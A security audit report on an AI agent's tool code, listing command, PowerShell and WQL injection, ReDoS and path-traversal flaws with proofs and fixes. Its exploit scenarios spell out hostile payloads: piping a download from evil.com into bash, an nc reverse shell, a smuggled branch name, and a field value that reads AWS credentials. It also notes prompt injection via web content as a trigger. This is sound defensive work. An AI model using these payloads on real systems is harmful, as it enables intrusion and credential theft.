## CRITICAL

### [CRIT-1] Command Injection — `wsl_exec` passes unsanitized LLM-controlled string to `sh -c`

- **File**: `tools/windows/wsl-exec.js:69`
- **Category**: command-injection
- **Issue**: `wslExec({ command })` receives `command` directly from LLM tool args, then passes it verbatim as the argument to `sh -c`. No blocklist, no escaping, no sandbox — any shell metacharacter works.
- **Exploit scenario**: LLM (or prompt injection via web content) calls `wsl_exec` with `command: "curl http://evil.com/payload | bash"` or `command: "rm -rf ~/projects; nc -e /bin/sh evil.com 4444"`. Because the command lands inside WSL Linux environment, Windows-level TerminalRunner blocklists do NOT apply.
- **Proof**:
  ```js
  // wsl-exec.js:69
  args.push('sh', '-c', command);   // command = raw LLM arg, unfiltered
  const child = spawn('wsl.exe', args, { windowsHide: true });
  ```
  No `_checkBlocked()` call, no allowlist, no TerminalRunner integration.
- **Suggested fix**:
  ```js
  // Option A: Run through TerminalRunner blocklist before spawning
  const { TerminalRunner } = require('../terminal-runner');
  const check = new TerminalRunner().isBlocked(command);
  if (check.blocked) return { success: false, error: check.reason };
  
  // Option B: Restrict to allowlist (safest for this surface)
  const ALLOWED_PREFIX = /^(ls|cat|pwd|echo|git\s|node\s|npm\s)/;
  if (!ALLOWED_PREFIX.test(command.trim())) {
    return { success: false, error: 'Command not in allowlist' };
  }
  ```

### [CRIT-2] Command Injection — `worktree.js` interpolates `baseBranch` and branch name into `execSync` shell strings

- **File**: `lib/worktree.js:46`
- **Category**: command-injection
- **Issue**: `baseBranch` parameter (received from caller, ultimately from LLM) is interpolated directly into a template literal passed to `execSync` as a shell command string. Although `execSync` does not use `shell: true` by default, the API call here **does not pass `shell: false`** explicitly, so Node.js falls back to platform default which on some calls IS the shell. More critically, `this.branch` is also interpolated and the branch name contains LLM-controlled timestamp data combined with random chars.
- **Exploit scenario**: LLM passes `baseBranch = "main; curl http://evil.com | bash #"`. The execSync template becomes:  
  `git worktree add -b "orcai/..." "..." main; curl http://evil.com | bash #`
- **Proof**:
  ```js
  // lib/worktree.js:46
  execSync(`git worktree add -b "${this.branch}" "${this.worktreePath}" ${base}`, {
    cwd: this.projectDir,
    // No shell: false !
  });
  // Also line 97:
  execSync(`git worktree remove --force "${this.worktreePath}"`, { ... });
  // Also line 108:
  execSync(`git branch -D "${this.branch}"`, { ... });
  ```
  Note: `execSync` with a string argument on Node.js uses the OS shell by default (`/bin/sh -c` on Unix, `cmd.exe /d /s /c` on Windows).
- **Suggested fix**:
  ```js
  const { execFileSync } = require('child_process');
  // Replace execSync string template with execFileSync argv array:
  execFileSync('git', ['worktree', 'add', '-b', this.branch, this.worktreePath, base], {
    cwd: this.projectDir, encoding: 'utf-8', timeout: 30000
  });
  ```

## HIGH

### [HIGH-1] WQL Injection — `wmi_query` `where` clause is unsanitized user input

- **File**: `tools/windows/wmi-query.js:29`
- **Category**: WQL injection (analogous to SQL injection)
- **Issue**: The `where` parameter from LLM is sanitized only for single-quote escaping (`psString` → replace `'` with `''`). However, the entire WQL filter string can be crafted to escape the `-Filter` context using PowerShell string termination, or to enumerate sensitive classes via `OR` conditions. More dangerously, `class_name` and field names in `properties` pass through `psString` too, but a crafted `properties` array value like `Name; Get-Content C:\Users\..\.aws\credentials` lands directly inside `Select-Object ${selectFields}` without quotes.
- **Exploit scenario**: LLM calls `wmi_query({ class_name: "Win32_Process", properties: ["Name", "ProcessId; Get-Content $env:USERPROFILE\\.aws\\credentials"] })`. The `selectFields` becomes `Name,ProcessId; Get-Content ...` — the semicolon runs a second PS command.
- **Proof**:
  ```js
  // wmi-query.js:23-38
  const selectFields = Array.isArray(properties) && properties.length
    ? properties.map(psString).join(',')   // psString only escapes single quotes
    : '*';
  const script = `
    $data = ${cmd} | Select-Object ${selectFields}  // selectFields not quoted — PS injection
  `;
  ```
- **Suggested fix**:
  ```js
  // Whitelist property names (only alnum + underscore allowed for WMI properties)
  const safeFields = properties
    .filter(p => /^[A-Za-z_][A-Za-z0-9_]*$/.test(p))
    .join(',') || '*';
  ```

### [HIGH-2] PowerShell Injection — `services.js` `filter` param interpolated without quoting into pipeline

- **File**: `tools/windows/services.js:24`
- **Category**: PowerShell injection
- **Issue**: `filter` parameter is escaped with `q()` (single-quote doubling) but is then interpolated into the PS pipeline **without surrounding single-quotes**, directly inside a `-like '*${q(filter)}*'` template. The `q()` function escapes `'` → `''`, but the resulting string is wrapped in `'...'` within the template, which is correct for the `-like` values. **However**, the `where` variable (built from filter) is then pasted directly into the command string without quotes around the `-Where-Object` block, and if `filter` contains `}` it terminates the `Where-Object` script block early.
- **Exploit scenario**: `filter = "x' -or $true } | Get-ChildItem C:\Users | "` → the PS pipeline gets mutated.
- **Proof**:
  ```js
  // services.js:24
  const where = filter
    ? `| Where-Object { $_.Name -like '*${q(filter)}*' -or $_.DisplayName -like '*${q(filter)}*' }`
    : '';
  // q() only escapes ', but does NOT escape } which closes the script block
  ```
- **Suggested fix**:
  ```js
  // Allowlist filter to safe alphanumeric + common service name chars
  const safeFilter = String(filter || '').replace(/[^a-zA-Z0-9\-_.]/g, '');
  ```

### [HIGH-3] ReDoS — `searchFiles` uses LLM-controlled regex without timeout

- **File**: `tools/file-manager.js:346`
- **Category**: ReDoS (Regex Denial of Service)
- **Issue**: `pattern` arg comes directly from LLM output and is compiled into a `RegExp` without any timeout protection. A catastrophic backtracking pattern (e.g., `/(a+)+$/`) applied line-by-line to thousands of files will block the Node.js event loop indefinitely.
- **Exploit scenario**: LLM generates `search_files({ pattern: "(a+)+b", path: "." })`. For each line of each file that does NOT end in `b`, the regex engine backtracks exponentially. On a 10K LOC codebase this hangs the process for minutes or forever.
- **Proof**:
  ```js
  // file-manager.js:346
  const regex = new RegExp(pattern, 'gi');  // pattern = raw LLM arg
  for (const file of files) {
    // ...
    for (let i = 0; i < lines.length; i++) {
      if (regex.test(lines[i])) {  // No timeout — event loop blocked
  ```
  Same issue exists at `tools/embedding-search.js:210` for `path_filter`.
- **Suggested fix**:
  ```js
  // Option A: Wrap in worker_threads with AbortController
  // Option B: Use safe-regex package to reject catastrophic patterns
  const safeRegex = require('safe-regex');
  if (!safeRegex(pattern)) {
    return { success: false, error: 'Pattern may cause catastrophic backtracking' };
  }
  const regex = new RegExp(pattern, 'gi');
  ```

## MEDIUM

### [MED-1] `shadow-git.js` `diffSnapshot` / `rollbackTo` — file path interpolation in `execSync` shell string

- **File**: `tools/shadow-git.js:382,439,441`
- **Category**: command-injection (lower severity — hash is validated, file paths partially filtered)
- **Issue**: After validating `snapshotId` as a hex SHA, file paths from `git diff --name-status` output are interpolated into shell command strings in `_exec()`. `_exec()` uses `execSync(command, ...)` with a string — meaning shell. A file path containing `"` or `;` or `` ` `` would escape the double-quote wrapping.
- **Proof**:
  ```js
  // shadow-git.js:382
  this._exec(`git checkout ${snapshotId} -- "${f}"`);
  // shadow-git.js:439,441
  const diffCmd = target
    ? `git diff --unified=3 ${snapshotId} ${target} -- "${filePath}"`
    : `git diff --unified=3 ${snapshotId} -- "${filePath}"`;
  ```
  `filePath` originates from `git diff --name-status` output — normally safe, but a maliciously crafted commit (e.g., from a compromised dependency repo) could embed paths with shell metacharacters.
- **Suggested fix**: Switch `_exec` to `execFileSync` with argv arrays for all commands taking dynamic paths.

### [MED-2] `glob-tool.js` — `cwd` not validated against project boundary

- **File**: `tools/glob-tool.js:29`
- **Category**: path-traversal (read)
- **Issue**: `cwd` from LLM args is normalized via `path.isAbsolute` / `path.resolve`, but there is NO check that `resolved` remains inside `projectDir`. An LLM can pass `cwd: "../../"` or `cwd: "C:/Users/buiho/.ssh"` and glob will enumerate arbitrary directories.
- **Proof**:
  ```js
  // glob-tool.js:29
  const resolved = path.isAbsolute(cwd) ? path.normalize(cwd) : path.resolve(projectDir, cwd);
  // No startsWith(projectDir) check
  ```
- **Suggested fix**:
  ```js
  if (!resolved.startsWith(path.normalize(projectDir) + path.sep) && resolved !== path.normalize(projectDir)) {
    return { success: false, error: 'cwd must be inside project directory' };
  }
  ```

### [MED-3] `ast-parse.js` — `absPath` resolved without project boundary check

- **File**: `tools/ast-parse.js:139,267,421`
- **Category**: path-traversal (read + write)
- **Issue**: All entry functions in `ast-parse.js` use `path.resolve(filePath)` directly, with no project boundary validation. An LLM can read or write AST-transformed content to any file on the system.
- **Proof**:
  ```js
  // ast-parse.js:139
  const absPath = path.resolve(filePath);
  // ... (no check against projectDir)
  // ast-parse.js:501
  fs.writeFileSync(absPath, output, 'utf8');  // Write anywhere
  ```

### [MED-4] `session-continuity.js` — `conversationManager.on('turn')` listener never removed

- **File**: `lib/session-continuity.js:254-258`
- **Category**: memory leak (event listener accumulation)
- **Issue**: `conversationManager.on('turn', handler)` and `conversationManager.on('session-end', handler)` are registered in `startSession()` but no corresponding `.off()` / `removeListener()` call exists. If `startSession()` is called multiple times in a long-running process (e.g., multi-session CLI loop), listeners accumulate indefinitely, causing memory leak and potentially duplicate event firing.
- **Proof**:
  ```js
  // session-continuity.js:254-258
  conversationManager.on('turn', (payload) => { ... });
  conversationManager.on('session-end', (payload) => { ... });
  // No removeListener / off() anywhere in the file
  ```

## LOW

### [LOW-1] `lib/init-project.js:50` — `execSync` string template for git branch

- **File**: `lib/init-project.js:50`
- **Category**: minor command-injection risk
- **Issue**: `execSync('git rev-parse --abbrev-ref HEAD', ...)` — this specific call uses a hardcoded string with no user input, so no injection risk. But the pattern (string-based `execSync`) is used inconsistently — safe here but sets a dangerous precedent when copy-pasted with dynamic inputs.
- **Suggested fix**: Migrate to `execFileSync('git', ['rev-parse', '--abbrev-ref', 'HEAD'], ...)` for consistency and future safety.

### [LOW-2] `bin/orcai-loop-start.js:43` — `shell: true` on Windows for pm2

- **File**: `bin/orcai-loop-start.js:43`
- **Category**: shell: true with partially user-controlled args
- **Issue**: `pm2Run()` calls `spawnSync(pm2, args, { shell: useShell })` where `useShell = true` on Windows. The `pm2` binary path is derived from well-known paths, so not directly injectable. However, using `shell: true` is unnecessary risk — `pm2.cmd` works directly with `shell: true` removed if the path is explicit.
- **Note**: No actual user input flows into `pm2` path or `args` here — LOW severity.
